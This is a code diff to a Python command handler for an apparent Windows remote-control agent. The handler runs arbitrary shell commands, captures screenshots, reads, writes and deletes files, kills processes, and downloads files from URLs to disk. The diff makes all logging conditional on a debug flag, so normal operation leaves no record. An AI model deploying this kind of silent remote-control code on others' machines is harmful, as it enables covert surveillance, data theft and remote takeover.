@@ -8,6 +8,7 @@ import os
 import shutil
 import datetime
 import ctypes
+from config import Config
 
 class CommandError(Exception):
     pass
@@ -15,7 +16,8 @@ class CommandError(Exception):
 class CommandHandler:
     @staticmethod
     def execute(command_type, params):
-        logging.info(f"Executing command type: {command_type}, params: {params}")
+        if Config.DEBUG_MODE:
+            logging.info(f"Executing command type: {command_type}, params: {params}")
         handlers = {
             'system_info': CommandHandler.handle_system_info,
             'system_command': CommandHandler.handle_system_command,
@@ -30,7 +32,8 @@ class CommandHandler:
         
         handler = handlers.get(command_type)
         if not handler:
-            logging.error(f"Unknown command type: {command_type}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Unknown command type: {command_type}")
             raise CommandError(f"Unknown command type: {command_type}")
         
         return handler(params)
@@ -39,7 +42,8 @@ class CommandHandler:
     def handle_end_task(params):
         process_name = params.get('process_name')
         if not process_name:
-            logging.error("No process name provided")
+            if Config.DEBUG_MODE:
+                logging.error("No process name provided")
             raise CommandError("No process name provided")
         
         try:
@@ -49,7 +53,8 @@ class CommandHandler:
                 text=True,
                 timeout=30
             )
-            logging.info(f"Task {process_name} terminated: {result.stdout}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Task {process_name} terminated: {result.stdout}")
             return {
                 'status': 'success',
                 'message': f"Task {process_name} terminated",
@@ -58,10 +63,12 @@ class CommandHandler:
                 'returncode': result.returncode
             }
         except subprocess.TimeoutExpired:
-            logging.error(f"Taskkill timed out for {process_name}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Taskkill timed out for {process_name}")
             raise CommandError(f"Taskkill timed out for {process_name}")
         except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to terminate task {process_name}: {e.stderr}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to terminate task {process_name}: {e.stderr}")
             return {
                 'status': 'failed',
                 'message': f"Failed to terminate task {process_name}",
@@ -70,14 +77,16 @@ class CommandHandler:
                 'returncode': e.returncode
             }
         except Exception as e:
-            logging.error(f"Error terminating task {process_name}: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Error terminating task {process_name}: {str(e)}")
             raise CommandError(f"Error terminating task {process_name}: {str(e)}")
 
     @staticmethod
     def handle_system_command(params):
         command = params.get('command')
         if not command:
-            logging.error("No command provided")
+            if Config.DEBUG_MODE:
+                logging.error("No command provided")
             raise CommandError("No command provided")
         
         # Map commands to Windows equivalents
@@ -91,22 +100,19 @@ class CommandHandler:
         
         # Check if running as admin for sensitive commands
         sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout']
-        if command.lower() in sensitive_commands:
-            try:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
-                if not is_admin:
-                    logging.error(f"Command {command} requires admin privileges")
-                    raise CommandError(f"Command {command} requires admin privileges")
-            except Exception as e:
-                logging.error(f"Failed to check admin privileges: {str(e)}")
-                raise CommandError(f"Failed to check admin privileges: {str(e)}")
+        if command.lower() in sensitive_commands and not ctypes.windll.shell32.IsUserAnAdmin():
+            if Config.DEBUG_MODE:
+                logging.error(f"Command '{command}' requires admin privileges. Please run as administrator.")
+            raise CommandError(f"Command '{command}' requires admin privileges. Please run as administrator.")
         
         # Apply command mapping
         actual_command = COMMAND_MAPPING.get(command.lower(), command)
-        logging.info(f"Mapped command: {command} -> {actual_command}")
+        if Config.DEBUG_MODE:
+            logging.info(f"Mapped command: {command} -> {actual_command}")
         
         try:
-            logging.info(f"Executing system command: {actual_command}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Executing system command: {actual_command}")
             shell_cmd = ['cmd.exe', '/c', actual_command]
             
             result = subprocess.run(
@@ -121,13 +127,16 @@ class CommandHandler:
                 'stderr': result.stderr,
                 'returncode': result.returncode
             }
-            logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
+            if Config.DEBUG_MODE:
+                logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
             return output
         except subprocess.TimeoutExpired:
-            logging.error(f"Command timed out: {actual_command}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Command timed out: {actual_command}")
             raise CommandError(f"Command timed out: {actual_command}")
         except Exception as e:
-            logging.error(f"Failed to execute command: {actual_command}, error: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to execute command: {actual_command}, error: {str(e)}")
             raise CommandError(f"Failed to execute command: {str(e)}")
 
     @staticmethod
@@ -135,19 +144,22 @@ class CommandHandler:
         action = params.get('action')
         path = params.get('path')
         if not action or not path:
-            logging.error("Missing action or path")
+            if Config.DEBUG_MODE:
+                logging.error("Missing action or path")
             raise CommandError("Missing action or path")
         
         restricted_paths = ['/etc', '/var', '/root', 'C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)']
         for restricted in restricted_paths:
             if path.lower().startswith(restricted.lower()):
-                logging.error(f"Access to restricted path denied: {path}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Access to restricted path denied: {path}")
                 raise CommandError(f"Access to restricted path denied: {path}")
         
         try:
             if action == 'list':
                 if not os.path.exists(path):
-                    logging.error(f"Path does not exist: {path}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Path does not exist: {path}")
                     raise CommandError(f"Path does not exist: {path}")
                 
                 result = []
@@ -160,12 +172,14 @@ class CommandHandler:
                         'size': stat.st_size,
                         'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
                     })
-                logging.info(f"Directory listing for {path}: {len(result)} items")
+                if Config.DEBUG_MODE:
+                    logging.info(f"Directory listing for {path}: {len(result)} items")
                 return {'files': result}
             
             elif action == 'recursive_list':
                 if not os.path.exists(path):
-                    logging.error(f"Path does not exist: {path}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Path does not exist: {path}")
                     raise CommandError(f"Path does not exist: {path}")
                 
                 result = []
@@ -212,47 +226,57 @@ class CommandHandler:
                         else:
                             size = round(item['size'] / 1024, 2)
                             f.write(f"{indent}{item['type'][0].upper()}: {item['path']} ({size} KB, {item['modified']})\n")
-                logging.info(f"Recursive listing for {path} completed, saved to {temp_file}")
+                if Config.DEBUG_MODE:
+                    logging.info(f"Recursive listing for {path} completed, saved to {temp_file}")
                 return {'file_path': temp_file}
             
             elif action == 'read':
                 if not os.path.isfile(path):
-                    logging.error(f"Not a file: {path}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Not a file: {path}")
                     raise CommandError(f"Not a file: {path}")
                 if os.path.getsize(path) > 1024 * 1024:
-                    logging.error(f"File too large: {path}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"File too large: {path}")
                     raise CommandError(f"File too large: {path}")
                 with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
-                logging.info(f"File read successfully: {path}")
+                if Config.DEBUG_MODE:
+                    logging.info(f"File read successfully: {path}")
                 return {'content': content, 'file_path': path}
             
             elif action == 'write':
                 content = params.get('content')
                 if not content:
-                    logging.error("Missing content for write operation")
+                    if Config.DEBUG_MODE:
+                        logging.error("Missing content for write operation")
                     raise CommandError("Missing content for write operation")
                 with open(path, 'w', encoding='utf-8') as f:
                     f.write(content)
-                logging.info(f"File written successfully: {path}")
+                if Config.DEBUG_MODE:
+                    logging.info(f"File written successfully: {path}")
                 return {'status': 'success', 'file_path': path}
             
             elif action == 'delete':
                 if not os.path.exists(path):
-                    logging.error(f"Path does not exist: {path}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Path does not exist: {path}")
                     raise CommandError(f"Path does not exist: {path}")
                 if os.path.isdir(path):
                     shutil.rmtree(path, ignore_errors=True)
                 else:
                     os.remove(path)
-                logging.info(f"Path deleted successfully: {path}")
+                if Config.DEBUG_MODE:
+                    logging.info(f"Path deleted successfully: {path}")
                 return {'status': 'success', 'file_path': path}
             
             else:
-                logging.error(f"Unsupported file operation: {action}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Unsupported file operation: {action}")
                 raise CommandError(f"Unsupported file operation: {action}")
         except Exception as e:
-            logging.error(f"File operation failed: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"File operation failed: {str(e)}")
             raise CommandError(f"File operation failed: {str(e)}")
 
     @staticmethod
@@ -266,10 +290,12 @@ class CommandHandler:
                 'memory': psutil.virtual_memory()._asdict(),
                 'disk': psutil.disk_usage('/')._asdict()
             }
-            logging.info("System info collected successfully")
+            if Config.DEBUG_MODE:
+                logging.info("System info collected successfully")
             return system_info
         except Exception as e:
-            logging.error(f"Failed to collect system info: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to collect system info: {str(e)}")
             raise CommandError(f"Failed to collect system info: {str(e)}")
 
     @staticmethod
@@ -282,17 +308,20 @@ class CommandHandler:
             with open(screenshot_path, 'rb') as f:
                 screenshot_data = f.read()
             os.remove(screenshot_path)
-            logging.info("Screenshot captured successfully")
+            if Config.DEBUG_MODE:
+                logging.info("Screenshot captured successfully")
             return {'screenshot': base64.b64encode(screenshot_data).decode()}
         except Exception as e:
-            logging.error(f"Failed to capture screenshot: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to capture screenshot: {str(e)}")
             raise CommandError(f"Failed to capture screenshot: {str(e)}")
 
     @staticmethod
     def handle_process_management(params):
         action = params.get('action')
         if not action:
-            logging.error("Missing action")
+            if Config.DEBUG_MODE:
+                logging.error("Missing action")
             raise CommandError("Missing action")
         
         try:
@@ -303,17 +332,20 @@ class CommandHandler:
                 ]
                 return {'processes': processes}
             else:
-                logging.error(f"Unsupported process management action: {action}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Unsupported process management action: {action}")
                 raise CommandError(f"Unsupported process management action: {action}")
         except Exception as e:
-            logging.error(f"Process management failed: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Process management failed: {str(e)}")
             raise CommandError(f"Process management failed: {str(e)}")
 
     @staticmethod
     def handle_edit_hosts(params):
         action = params.get('action')
         if not action:
-            logging.error("Missing action")
+            if Config.DEBUG_MODE:
+                logging.error("Missing action")
             raise CommandError("Missing action")
         
         try:
@@ -323,26 +355,31 @@ class CommandHandler:
                     content = f.read()
                 return {'content': content}
             else:
-                logging.error(f"Unsupported hosts action: {action}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Unsupported hosts action: {action}")
                 raise CommandError(f"Unsupported hosts action: {action}")
         except Exception as e:
-            logging.error(f"Edit hosts failed: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Edit hosts failed: {str(e)}")
             raise CommandError(f"Edit hosts failed: {str(e)}")
 
     @staticmethod
     def handle_open_url(params):
         url = params.get('url')
         if not url:
-            logging.error("No URL provided")
+            if Config.DEBUG_MODE:
+                logging.error("No URL provided")
             raise CommandError("No URL provided")
         
         try:
             import webbrowser
             webbrowser.open(url)
-            logging.info(f"Opened URL: {url}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Opened URL: {url}")
             return {'status': 'success'}
         except Exception as e:
-            logging.error(f"Failed to open URL: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to open URL: {str(e)}")
             raise CommandError(f"Failed to open URL: {str(e)}")
 
     @staticmethod
@@ -351,7 +388,8 @@ class CommandHandler:
         file_url = params.get('file_url')
         dest_path = params.get('dest_path')
         if not source or not file_url or not dest_path:
-            logging.error("Missing source, file_url, or dest_path")
+            if Config.DEBUG_MODE:
+                logging.error("Missing source, file_url, or dest_path")
             raise CommandError("Missing source, file_url, or dest_path")
         
         try:
@@ -361,11 +399,14 @@ class CommandHandler:
                 response.raise_for_status()
                 with open(dest_path, 'wb') as f:
                     f.write(response.content)
-                logging.info(f"File downloaded from {file_url} to {dest_path}")
+                if Config.DEBUG_MODE:
+                    logging.info(f"File downloaded from {file_url} to {dest_path}")
                 return {'status': 'success', 'path': dest_path}
             else:
-                logging.error(f"Unsupported upload source: {source}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Unsupported upload source: {source}")
                 raise CommandError(f"Unsupported upload source: {source}")
         except Exception as e:
-            logging.error(f"File upload failed: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"File upload failed: {str(e)}")
             raise CommandError(f"File upload failed: {str(e)}")
